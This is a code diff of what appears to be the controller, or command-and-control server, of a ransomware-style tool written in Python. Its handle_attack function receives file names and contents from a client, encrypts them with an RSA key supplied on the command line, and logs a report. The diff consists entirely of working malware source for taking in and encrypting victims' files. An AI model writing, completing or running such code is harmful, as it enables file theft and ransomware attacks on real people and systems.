@@ -145,6 +145,11 @@ DO_PRINT_LOG = False
 EXIT_FLAG = False
 BIND_PORT = -1
 
+RSA_PRIV_KEY_B = None
+RSA_PRIV_KEY_A = None
+RSA_PUBL_KEY_B = None
+RSA_PUBL_KEY_A = None
+
 
 
 
@@ -434,22 +439,10 @@ def handle_attack(addr:"tuple[str, int]"):
 		# We have closed the connection to the client.
 		return
 
-	logger().info(f"Requesting the public and private keys from the client @[{addr[0]}]...")
-	msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
-	if not msg:
-		return
-	pub1, pub2 = msg.split(",")
-	msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
-	if not msg:
-		return
-	priv1, priv2 = msg.split(",")
-	logger().info(f"Public key: ({pub1}, {pub2})")
-	logger().info(f"Private key: ({priv1}, {priv2})")
-
 	logger().info(f"Requesting the list of file names to encrypt from the client @[{addr[0]}]...")
 	msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
 	assert msg == "BEGIN_FILE_LIST"
-	files:"dict[str,list[str]|None]" = {}
+	files:"dict[str,str|None]" = {}
 	while True:
 		msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
 		logger().info(f"Received file name: {msg}")
@@ -463,23 +456,30 @@ def handle_attack(addr:"tuple[str, int]"):
 	msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
 	assert msg == "BEGIN_FILE_CONTENTS"
 	for file in files.keys():
-		encrypted_liens = []
 		END_FILE_TOK = "END\x01FILE"
-		while True:
-			msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
-			if msg == END_FILE_TOK:
-				break
-			print(msg, end="")
-			encrypted_liens.append(msg)
+		encoded = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
+		assert controller.recv(cancel_flag_p=CANCEL_RECV_FLAG) == END_FILE_TOK
 		logger().info(f"Received contents of file [{file}]:\n")
-		files[file] = encrypted_liens
+		print(encoded, end="")
+		files[file] = encoded
 	assert controller.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "END_FILE_CONTENTS"
 	logger().info(f"Received contents of all files.")
 
+	assert isinstance(RSA_PUBL_KEY_A, int)
+	assert isinstance(RSA_PUBL_KEY_B, int)
+	assert isinstance(RSA_PRIV_KEY_A, int)
+	assert isinstance(RSA_PRIV_KEY_B, int)
+	rsa = RSA()
+	rsa.set_public_key(RSA_PUBL_KEY_A, RSA_PUBL_KEY_B)
+	rsa.set_private_key(RSA_PRIV_KEY_A, RSA_PRIV_KEY_B)
+	encrypted_files:"dict[str,str]" = {}
+	for f_name, contents in files.items():
+		assert contents is not None
+		encrypted = [str(x) for x in rsa.encrypt(contents)]
+		encrypted_files[f_name] = ",".join(encrypted)
+
 	report = {
-		"public_key": (pub1, pub2),
-		"private_key": (priv1, priv2),
-		"files": files
+		"files": encrypted_files
 	}
 	logger().info(f"Generated report: [{report}]")
 
@@ -969,8 +969,18 @@ def main():
 
 
 if __name__ == "__main__":
-	if len(sys.argv) != 2:
-		print("Usage: python controller.py <bind port>")
+	if len(sys.argv) != 5:
+		usage_msg = f"Usage: python {sys.argv[0]} "
+		usage_msg += "<<<bind port>>> "
+		usage_msg += "<<<rsa priv key b>>> "
+		usage_msg += "<<<rsa priv key a>>> "
+		usage_msg += "<<<rsa publ key b>>> "
+		print(usage_msg)
+		exit(1)
 	BIND_PORT = int(sys.argv[1])
+	RSA_PRIV_KEY_B = int(sys.argv[2])
+	RSA_PRIV_KEY_A = int(sys.argv[3])
+	RSA_PUBL_KEY_B = int(sys.argv[4])
+	RSA_PUBL_KEY_A = 65537
 	main()
 
